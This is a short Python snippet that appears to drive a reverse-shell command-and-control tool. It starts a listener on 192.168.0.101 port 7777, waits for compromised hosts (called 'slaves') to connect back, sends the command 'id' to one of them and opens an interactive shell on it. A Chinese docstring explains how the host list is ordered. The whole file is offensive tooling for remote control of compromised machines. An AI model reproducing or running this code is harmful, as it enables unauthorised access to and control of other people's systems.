

if __name__ == "utils":
    """
    默认第一个slaves是使用主机字典,默认第一个主机是自己

    """
    from .ReverseShellManager import run, slaves
    import time
    run('192.168.0.101', 7777)
    while True:
        time.sleep(0.2)
        print(slaves)
        a = [i for i in slaves.values()]
        if len(a) > 1:
            a[1].send_command_print(b'id')
            a[1].interactive_shell()
